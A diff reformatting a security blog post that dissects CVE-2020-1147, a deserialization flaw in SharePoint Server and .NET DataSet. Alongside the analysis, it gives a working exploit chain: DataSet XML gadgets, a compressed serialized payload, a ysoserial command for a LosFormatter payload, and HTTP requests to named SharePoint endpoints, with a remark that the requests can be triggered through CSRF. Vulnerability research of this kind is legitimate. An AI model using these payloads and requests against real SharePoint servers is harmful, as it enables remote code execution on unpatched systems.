@@ -3,32 +3,27 @@ layout: post
 title: "SharePoint and Pwn :: Remote Code Execution Against SharePoint Server Abusing DataSet"
 date: 2020-07-20 09:00:00 -0500
 categories: blog
-excerpt_separator: <!--more-->
 ---
 
-<img class="excel" alt="SharePoint" src="/assets/images/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset/sp-logo.png">
-<p class="cn" markdown="1">When [CVE-2020-1147](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1147) was released last week I was curious as to how this vulnerability manifested and how an attacker might achieve remote code execution with it. Since I'm somewhat familiar with SharePoint Server and .net, I decided to take a look.</p>
+![SharePoint](/assets/images/sharepoint-and-pwn/sp-logo.png "SharePoint")
 
+When [CVE-2020-1147](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1147) was released last week I was curious as to how this vulnerability manifested and how an attacker might achieve remote code execution with it. Since I'm somewhat familiar with SharePoint Server and .net, I decided to take a look.
 <!--more-->
 
-<p class="cn">TL;DR</p>
+TL;DR; *I share the breakdown of CVE-2020-1147 which was discovered independently by [Oleksandr Mirosh](https://twitter.com/olekmirosh), [Markus Wulftange](https://twitter.com/mwulftange) and [Jonathan Birch](https://www.linkedin.com/in/jonathan-birch-ab27681/). I share the details on how it can be leveraged against a SharePoint Server instance to gain remote code execution as a low privileged user. Please note: I am not providing a full exploit, so if that's your jam, move along.*
 
-<p class="cn" markdown="1">*I share the breakdown of CVE-2020-1147 which was discovered independently by [Oleksandr Mirosh](https://twitter.com/olekmirosh), [Markus Wulftange](https://twitter.com/mwulftange) and [Jonathan Birch](https://www.linkedin.com/in/jonathan-birch-ab27681/). I share the details on how it can be leveraged against a SharePoint Server instance to gain remote code execution as a low privileged user. Please note: I am not providing a full exploit, so if that's your jam, move along.*</p>
+One of the things that stood out to me, was that Microsoft published [Security Guidence](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance) related to this bug, quoting Microsoft:
 
-<p class="cn" markdown="1">One of the things that stood out to me, was that Microsoft published [Security Guidence](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance) related to this bug, quoting Microsoft:</p>
-
-<div markdown="1" class="cn">
 > If the incoming XML data contains an object whose type is not in this list...
 > An exception is thrown.
 > The deserialization operation fails.
 > When loading XML into an existing DataSet or DataTable instance, the existing column definitions are also taken into account. If the table already contains a column definition of a custom type, that type is temporarily added to the allow list for the duration of the XML deserialization operation.
-</div>
 
-<p class="cn" markdown="1">Interestingly, it was possible to specify types and it was possible to overwrite column definitions. That was the key giveaway for me, let's take a look at how the `DataSet` object is created:</p>
+Interestingly, it was possible to specify types and it was possible to overwrite column definitions. That was the key giveaway for me, let's take a look at how the `DataSet` object is created:
 
 ## Understanding the DataSet Object
 
-<p class="cn" markdown="1">A [`DataSet`](https://docs.microsoft.com/en-us/dotnet/api/system.data.dataset?view=netcore-3.1) contains a `Datatable` with `DataColumn`(s) and `DataRow`(s). More importantly, it implements the `ISerializable` interface meaning that it can be serialized with `XmlSerializer`. Let's start by creating a `DataTable`:</p>
+A [`DataSet`](https://docs.microsoft.com/en-us/dotnet/api/system.data.dataset?view=netcore-3.1) contains a `Datatable` with `DataColumn`(s) and `DataRow`(s). More importantly, it implements the `ISerializable` interface meaning that it can be serialized with `XmlSerializer`. Let's start by creating a `DataTable`:
 
 ```c#
         static void Main(string[] args)
@@ -51,7 +46,7 @@ excerpt_separator: <!--more-->
         }		
 ```
 
-<p class="cn" markdown="1">Using the `WriteXmlSchema` method, It's possible to write out the schema definition. That code produces the following:</p>
+Using the `WriteXmlSchema` method, It's possible to write out the schema definition. That code produces the following:
 
 ```xml
 <?xml version="1.0" standalone="yes"?>
@@ -72,7 +67,7 @@ excerpt_separator: <!--more-->
 </xs:schema>
 ```
 
-<p class="cn" markdown="1">Looking into the code of `DataSet` it's revealed that it exposes its own serialization methods (wrapped over `XmlSerializer`) using `WriteXml` and `ReadXML`:</p>
+Looking into the code of `DataSet` it's revealed that it exposes its own serialization methods (wrapped over `XmlSerializer`) using `WriteXml` and `ReadXML`:
 
 ```
 System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
@@ -85,7 +80,7 @@ System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
               System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
 ```
 
-<p class="cn" markdown="1">Now, all that's left to do is add the table to a dataset and serialize it up:</p>
+Now, all that's left to do is add the table to a dataset and serialize it up:
 
 ```c#
             DataSet ds = new DataSet("poc");
@@ -97,11 +92,11 @@ System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
             }
 ```
 
-<p class="cn" markdown="1">These serialization methods retain schema types and reconstruct attacker influenced types at runtime using a single `DataSet` expected type in the instantiated `XmlSerializer` object graph.</p>
+These serialization methods retain schema types and reconstruct attacker influenced types at runtime using a single `DataSet` expected type in the instantiated `XmlSerializer` object graph.
 
 ## The DataSet Gadget
 
-<p class="cn" markdown="1">Below is an example of such a gadget that can be crafted, note that this is not to be confused with the `DataSet` gadgets in [ysoserial](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/DataSetGenerator.cs):</p>
+Below is an example of such a gadget that can be crafted, note that this is not to be confused with the `DataSet` gadgets in [ysoserial](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/DataSetGenerator.cs):
 
 ```xml
 <DataSet>
@@ -139,9 +134,9 @@ System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
 </DataSet>
 ```
 
-<p class="cn" markdown="1">This gadget chain will call an arbitrary static method on a `Type` which contains no interface members. Here I used the notorious `XamlReader.Parse` to load malicious Xaml to execute a system command. I used the `ExpandedWrapper` class to load two different types as mentioned by [@pwntester](https://twitter.com/pwntester)'s [amazing research](https://speakerdeck.com/pwntester/attacking-net-serialization).</p>
+This gadget chain will call an arbitrary static method on a `Type` which contains no interface members. Here I used the notorious `XamlReader.Parse` to load malicious Xaml to execute a system command. I used the `ExpandedWrapper` class to load two different types as mentioned by [@pwntester](https://twitter.com/pwntester)'s [amazing research](https://speakerdeck.com/pwntester/attacking-net-serialization).
 
-<p class="cn" markdown="1">It can be leveraged in a number of sinks, such as:</p>
+It can be leveraged in a number of sinks, such as:
 
 ```c#
 XmlSerializer ser = new XmlSerializer(typeof(DataSet));
@@ -149,7 +144,7 @@ Stream reader = new FileStream("c:/poc.xml", FileMode.Open);
 ser.Deserialize(reader);		
 ```
 
-<p class="cn" markdown="1">Many applications consider `DataSet` to be safe, so even if the expected type can't be controlled directly to `XmlSerializer`, `DataSet` is typically used in the object graph. However, the most interesting sink is the `DataSet.ReadXml` to trigger code execution:</p>
+Many applications consider `DataSet` to be safe, so even if the expected type can't be controlled directly to `XmlSerializer`, `DataSet` is typically used in the object graph. However, the most interesting sink is the `DataSet.ReadXml` to trigger code execution:
 
 ```c#
 DataSet ds = new DataSet();
@@ -158,7 +153,7 @@ ds.ReadXml("c:/poc.xml");
 
 ## Applying the Gadget to SharePoint Server
 
-<p class="cn" markdown="1">If we take a look at [ZDI-20-874](https://www.zerodayinitiative.com/advisories/ZDI-20-874/), the advisory mentions the `Microsoft.PerformancePoint.Scorecards.Client.ExcelDataSet` control which can be leveraged for remote code execution. This immediately plagued my interest since it had the name (DataSet) in its class name. Let's take a look at SharePoint's default web.config file:</p>
+If we take a look at [ZDI-20-874](https://www.zerodayinitiative.com/advisories/ZDI-20-874/), the advisory mentions the `Microsoft.PerformancePoint.Scorecards.Client.ExcelDataSet` control which can be leveraged for remote code execution. This immediately plagued my interest since it had the name (DataSet) in its class name. Let's take a look at SharePoint's default web.config file:
 
 ```xml
       <controls>
@@ -170,7 +165,7 @@ ds.ReadXml("c:/poc.xml");
       </controls>
 ```
 
-<p class="cn" markdown="1">Under the controls tag, we can see that a prefix doesn't exist for the `Microsoft.PerformancePoint.Scorecards` namespace. However, if we check the SafeControl tags, it is indeed listed with all types from that namespace permitted.</p>
+Under the controls tag, we can see that a prefix doesn't exist for the `Microsoft.PerformancePoint.Scorecards` namespace. However, if we check the SafeControl tags, it is indeed listed with all types from that namespace permitted.
 
 ```xml
 <configuration>
@@ -181,7 +176,7 @@ ds.ReadXml("c:/poc.xml");
 	  ...
 ```
 
-<p class="cn" markdown="1">Now that we know we can instantiate classes from that namespace, let's dive into the code to inspect the `ExcelDataSet` type:</p>
+Now that we know we can instantiate classes from that namespace, let's dive into the code to inspect the `ExcelDataSet` type:
 
 ```c#
 namespace Microsoft.PerformancePoint.Scorecards
@@ -192,9 +187,9 @@ namespace Microsoft.PerformancePoint.Scorecards
 	{
 ```
 
-<p class="cn" markdown="1">The first thing I noticed is that it's serializable, so I know that it can infact be instantiated as a control and the default constructor will be called along with any public setters that are not marked with the `System.Xml.Serialization.XmlIgnoreAttribute` attribute. SharePoint uses `XmlSerializer` for creating objects from controls so anywhere in the code where attacker supplied data can flow into `TemplateControl.ParseControl`, the `ExcelDataSet` type can be leveraged.</p>
+The first thing I noticed is that it's serializable, so I know that it can infact be instantiated as a control and the default constructor will be called along with any public setters that are not marked with the `System.Xml.Serialization.XmlIgnoreAttribute` attribute. SharePoint uses `XmlSerializer` for creating objects from controls so anywhere in the code where attacker supplied data can flow into `TemplateControl.ParseControl`, the `ExcelDataSet` type can be leveraged.
 
-<p class="cn" markdown="1">One of the properties that stood out was the `DataTable` property since it contains a public setter and uses the type `System.Data.DataTable`. However, on closer inspection, we can see that the `XmlIgnore` attribute is being used, so we can't trigger the deserialization using this setter.</p>
+One of the properties that stood out was the `DataTable` property since it contains a public setter and uses the type `System.Data.DataTable`. However, on closer inspection, we can see that the `XmlIgnore` attribute is being used, so we can't trigger the deserialization using this setter.
 
 ```c#
 [XmlIgnore]
@@ -220,7 +215,7 @@ public DataTable DataTable
 }
 ```
 
-<p class="cn" markdown="1">The above code does reveal the partial answer though, the getter calls `GetObjectFromCompressedBase64String` using the `compressedDataTable` property. This method will decode the supplied base64, decompress the binary formatter payload and call `BinaryFormatter.Deserialize` with it. However, the code contains expected types for the deserialization, one of which is `DataTable`, So we can't just stuff a generated  [TypeConfuseDelegate](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs) here.</p>
+The above code does reveal the partial answer though, the getter calls `GetObjectFromCompressedBase64String` using the `compressedDataTable` property. This method will decode the supplied base64, decompress the binary formatter payload and call `BinaryFormatter.Deserialize` with it. However, the code contains expected types for the deserialization, one of which is `DataTable`, So we can't just stuff a generated  [TypeConfuseDelegate](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs) here.
 
 ```c#
 		private static readonly Type[] ExpectedSerializationTypes = new Type[]
@@ -230,7 +225,7 @@ public DataTable DataTable
 		};
 ```
 
-<p class="cn" markdown="1">Inspecting the `CompressedDataTable` property, we can see that we have no issues setting the `compressedDataTable` member since it's using `System.Xml.Serialization.XmlElementAttribute` attribute.</p>
+Inspecting the `CompressedDataTable` property, we can see that we have no issues setting the `compressedDataTable` member since it's using `System.Xml.Serialization.XmlElementAttribute` attribute.
 
 ```c#
 [XmlElement]
@@ -252,7 +247,7 @@ public string CompressedDataTable
 }
 ```
 
-<p class="cn" markdown="1">Putting it (almost all) together, I could register a prefix and instantiate the control with a base64 encoded, compressed and serialized, albeit, dangerous `DataTable`:</p>
+Putting it (almost all) together, I could register a prefix and instantiate the control with a base64 encoded, compressed and serialized, albeit, dangerous `DataTable`:
 
 ```
 PUT /poc.aspx HTTP/1.1
@@ -264,18 +259,18 @@ Content-Length: 1688
 <escape:ExcelDataSet runat="server" CompressedDataTable="H4sIAAAAAAAEALVWW2/bNhROegmadtvbHvYm6KFPtmTHSdoqlgs06YZgcRPE2RqgKDKaOrbZSKRGUraMYv9o+43doUTZju2mabHJgESfOw+/80kbmxsbG5/wMk9zfXcPb296U6Uh8Y6IJjXnd5CKCR7ueg3zqzmHWawzCSGHTEsS15yzrB8z+itML8Q18LD/7BnZo3v7zRetXWg8f/HQBP9xIWZxuyD9GO6j5qfZP+8cEqEZH9qU25dJ3KMjSMgTXB2xweAXSZL7m5s/2GDWztS8bUJtPcDb34/aL/Mkdsa2brfpNVwHOBURhg7dTA/qzX33Zef7x+1cBapI4KAHV6Hrlosgx/VI6zTw/clk4k1anpBDf6fRaPqX3ZOyqMo2URHuAANLbqOpesKoFEoMdJ2KJEC7emnlYlbHMXkhhgS4djhJIHRf5+lV3mjsNK6KTpRmpSEGSGPIL6YpWGkpV/BnhruaC9fFTSfcdcrUQdFnjBK6i2fRAzlmFJR3zDVITmIPayE8guitJGkK8o+dd++sw1vGIzFRXpfI6yz1LkkSnwOJQCIGJChMSzS2/Gc8JZgIef0N4Gk1+4PW8719ErX2d6G19762nLyo+rT/Aag2yzMpxuz/LeF9zVnXsf9gNFxHFweC50b41BzO7LQ0kUPQb3AbKiUUDDQTxk8pzSRiExHtz9Hgr8KhkC1DpxBagHwGiEokYPIr0LNSjpXZdw906GqZzUvsEsZnw7uK4crsNwWHmZSY40RQYiyLKHeAOB0JbPTSvhOSV/8y3heZgeq8G3fZd9mvYlI7Ww+RMv553I6QXYYyKB8k+ZbRtj5liC/5VInq46blhIXOV3tZ6qhji2RR0WynEDZnfZZicipxEoouWdMRUYcjwoeA3WJcgdTYrHmPkR5mhMe+zHh1DKEJgmxOk9EdeHKRoSpyeW1R5y8qcZbNWEOEC2QePW0saFFfTv2xLcLBmoNyfuZM5N6IiD5d0CMRmTnqnBGpoO0vSNZYohFqkArVDS3q7YQupMXtB0pLfK24naexPjgHJTJJ4YhRQ0JETqv3iu2RxYM3w4OHePAnjA9y07R9P8eN+OkCkc06/XUxKreSt0KXxrLOKy6x0gOiFCT9eBomigoZs37ldcTIcL2PZ1RcKM2omvurQuc+HeoD04ZVcnbyADkwdE9IxunoMMGBLY3K99HHPCg6a4IH6IPkqv5ynflB4SsL+VDfksFbPr3KtKw76BXHZIQ0iYzcX1Gstfapg5xFnc+7+F9RzBrbmWoVPEbV9i3sbmLVvwWsbf+WOWr7OPMzrlwiGEuWN5mo7S9xY+eB+dZa+gYzX15bV13yQUh8MG4erzIWR9tX5zBmxsR8Xz7C65791vxkryf/AlZRMe+GCgAA" />
 ```
 
-<p class="cn" markdown="1">However, I couldn't figure out a way to trigger the `DataTable` property getter. I know I needed a way to use the DataSet, but I just didn't know *how* too.</p>
+However, I couldn't figure out a way to trigger the `DataTable` property getter. I know I needed a way to use the DataSet, but I just didn't know *how* too.
 
 ### Many Paths Lead to Rome 
 
-<p class="cn" markdown="1">The fustration! After going for a walk with my dog, I decided to think about this differently and I asked myself what other sinks are available. Then I remembered that the `DataSet.ReadXml` sink was also a source of trouble, so I checked the code again and found this valid code path:</p>
+The fustration! After going for a walk with my dog, I decided to think about this differently and I asked myself what other sinks are available. Then I remembered that the `DataSet.ReadXml` sink was also a source of trouble, so I checked the code again and found this valid code path:
 
 ```
 Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetDataSet()
   Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.PopulateDataSetFromCache(DataSet)
 ```
 
-<p class="cn" markdown="1">Inside of the `ContactLinksSuggestionsMicroView` class we can see the `GetDataSet` method:</p>
+Inside of the `ContactLinksSuggestionsMicroView` class we can see the `GetDataSet` method:
 
 ```c#
 		protected override DataSet GetDataSet()
@@ -323,8 +318,7 @@ Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetData
 		}
 ```
 
-<p class="cn" markdown="1">At *[1]* the code checks that the request is a POST back request. To ensure this, an attacker can set the `__viewstate` POST variable, then at *[2]* the code will check that the `__SUGGESTIONSCACHE__` POST variable is set, if it's set, the `IsInitialPostBack` getter will return false. As long as this getter returns false, an attacker can land at *[3]*, reaching `PopulateDataSetFromCache`. This call will use a `DataSet` that has been created with a specific schema definition.</p>
-
+At *[1]* the code checks that the request is a POST back request. To ensure this, an attacker can set the `__viewstate` POST variable, then at *[2]* the code will check that the `__SUGGESTIONSCACHE__` POST variable is set, if it's set, the `IsInitialPostBack` getter will return false. As long as this getter returns false, an attacker can land at *[3]*, reaching `PopulateDataSetFromCache`. This call will use a `DataSet` that has been created with a specific schema definition.
 
 ```c#
 		protected void PopulateDataSetFromCache(DataSet ds)
@@ -339,7 +333,7 @@ Microsoft.SharePoint.Portal.WebControls.ContactLinksSuggestionsMicroView.GetData
 		}
 ```
 
-<p class="cn" markdown="1">Inside of `PopulateDataSetFromCache`, the code calls `SPRequestParameterUtility.GetValue` to get attacker controlled data from the `__SUGGESTIONSCACHE__` request variable and parses it directly into `ReadXml` using `XmlTextReader`. The previously defined schema is overwritten with the attacker supplied schema inside of the supplied XML and deserialization of untrusted types occurs at *[4]*, leading to **remote code execution**. To trigger this, I created a page that uses the `ContactLinksSuggestionsMicroView` type specifically:</p>
+Inside of `PopulateDataSetFromCache`, the code calls `SPRequestParameterUtility.GetValue` to get attacker controlled data from the `__SUGGESTIONSCACHE__` request variable and parses it directly into `ReadXml` using `XmlTextReader`. The previously defined schema is overwritten with the attacker supplied schema inside of the supplied XML and deserialization of untrusted types occurs at *[4]*, leading to **remote code execution**. To trigger this, I created a page that uses the `ContactLinksSuggestionsMicroView` type specifically:
 
 ```
 PUT /poc.aspx HTTP/1.1
@@ -351,7 +345,7 @@ Content-Length: 252
 <escape:ContactLinksSuggestionsMicroView runat="server" />
 ```
 
-<p class="cn" markdown="1">If you are exploiting this bug as a low privlidged user and the `AddAndCustomizePages` setting is disabled, then you can possibly exploit the bug with pages that instantiate the `InputFormContactLinksSuggestionsMicroView` control, since it extends from `ContactLinksSuggestionsMicroView`.</p>
+If you are exploiting this bug as a low privlidged user and the `AddAndCustomizePages` setting is disabled, then you can possibly exploit the bug with pages that instantiate the `InputFormContactLinksSuggestionsMicroView` control, since it extends from `ContactLinksSuggestionsMicroView`.
 
 ```c#
 namespace Microsoft.SharePoint.Portal.WebControls
@@ -365,14 +359,12 @@ namespace Microsoft.SharePoint.Portal.WebControls
 	{
 ```
 
-<p class="cn" markdown="1">I found a few endpoints that implement that control ~~(but I haven't had time to test them)~~ Update: [Soroush Dalili](https://twitter.com/irsdl) tested them for me and [confirmed](https://twitter.com/irsdl/status/1287496351429865473) that they are indeed, exploitable.</p>
+I found a few endpoints that implement that control ~~(but I haven't had time to test them)~~ Update: [Soroush Dalili](https://twitter.com/irsdl) tested them for me and [confirmed](https://twitter.com/irsdl/status/1287496351429865473) that they are indeed, exploitable.
 
-<div markdown="1" class="cn">
 1. /_layouts/15/quicklinks.aspx?Mode=Suggestion
 2. /_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion
-</div>
 
-<p class="cn" markdown="1">Now, to exploit it we can perform a post request to our freshly crafted page:</p>
+Now, to exploit it we can perform a post request to our freshly crafted page:
 
 ```
 POST /poc.aspx HTTP/1.1
@@ -384,7 +376,7 @@ Content-Length: <length>
 __viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
 ```
 
-<p class="cn" markdown="1">or</p>
+or
 
 ```
 POST /quicklinks.aspx?Mode=Suggestion HTTP/1.1
@@ -396,7 +388,7 @@ Content-Length: <length>
 __viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
 ```
 
-<p class="cn" markdown="1">or</p>
+or
 
 ```
 POST /quicklinksdialogform.aspx?Mode=Suggestion HTTP/1.1
@@ -408,11 +400,11 @@ Content-Length: <length>
 __viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
 ```
 
-<p class="cn" markdown="1">Note that each of these endpoints could also be csrfed, so credentials are not necessarily required.</p>
+Note that each of these endpoints could also be csrfed, so credentials are not necessarily required.
 
 ## One Last Thing
 
-<p class="cn" markdown="1">You cannot use the `XamlReader.Load` static method because the IIS webserver is impersonating as the IUSR account and that account has limited access to the registry. If you try, you will end up with a stack trace like this unless you disable impersonation under IIS and use the application pool identity:</p>
+You cannot use the `XamlReader.Load` static method because the IIS webserver is impersonating as the IUSR account and that account has limited access to the registry. If you try, you will end up with a stack trace like this unless you disable impersonation under IIS and use the application pool identity:
 
 ```
 {System.InvalidOperationException: There is an error in the XML document. ---> System.TypeInitializationException: The type initializer for 'MS.Utility.EventTrace' threw an exception. ---> System.Security.SecurityException: Requested registry access is not allowed.
@@ -446,15 +438,15 @@ __viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
    at Microsoft.SharePoint.Portal.WebControls.PrivacyItemView.GetQueryResults(Object obj)
 ```
 
-<p class="cn" markdown="1">You need to find another dangerous static method or setter to call from a type that doesn't use interface members, ~~I leave this as an exercise to the reader, good luck!~~</p>
+You need to find another dangerous static method or setter to call from a type that doesn't use interface members, ~~I leave this as an exercise to the reader, good luck!~~
 
 ## Remote Code Execution Exploit
 
-<p class="cn" markdown="1">Ok so I lied. Look the truth is, I just want people to read the full blog post and not rush to find the exploit payload, it's better to understand the underlying technology you know? Anyway, to exploit this bug we can (ab)use the `LosFormatter.Deserialize` method since the class contains no interface members. To do so, we need to generate a base64 payload of a serialized `ObjectStateFormatter` gadget chain:</p>
+Ok so I lied. Look the truth is, I just want people to read the full blog post and not rush to find the exploit payload, it's better to understand the underlying technology you know? Anyway, to exploit this bug we can (ab)use the `LosFormatter.Deserialize` method since the class contains no interface members. To do so, we need to generate a base64 payload of a serialized `ObjectStateFormatter` gadget chain:
 
 `c:\> ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c mspaint`
 
-<p class="cn" markdown="1">Now, we can plug the payload into the following DataSet gadget and trigger **remote code execution** against the target SharePoint Server!</p>
+Now, we can plug the payload into the following DataSet gadget and trigger **remote code execution** against the target SharePoint Server!
 
 ```xml
 <DataSet>
@@ -492,21 +484,14 @@ __viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
 </DataSet>
 ```
 
-{% include image.html
-            img="assets/images/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset/rce.png"
-            title="Gaining code execution against the IIS process"
-            caption="Gaining code execution against the IIS process"
-            style="width:80%;height:80%" %}
-
+![Gaining code execution against the IIS process](/assets/images/sharepoint-and-pwn/rce.png "Gaining code execution against the IIS process")
 
 ## Conclusion
 
-<p class="cn" markdown="1">Microsoft rate this bug with an exploitability index rating of 1 and we agree, meaning you should patch this immediately if you haven't. It is highly likley that this gadget chain can be used against several applications built with .net so even if you don't have a SharePoint Server installed, you are still impacted by this bug.</p>
+Microsoft rate this bug with an exploitability index rating of 1 and we agree, meaning you should patch this immediately if you haven't. It is highly likley that this gadget chain can be used against several applications built with .net so even if you don't have a SharePoint Server installed, you are still impacted by this bug.
 
 ## References
 
-<div markdown="1" class="cn">
 - [https://speakerdeck.com/pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization)
 - [https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance)
 - [https://www.zerodayinitiative.com/advisories/ZDI-20-874/](https://www.zerodayinitiative.com/advisories/ZDI-20-874/)
-</div>
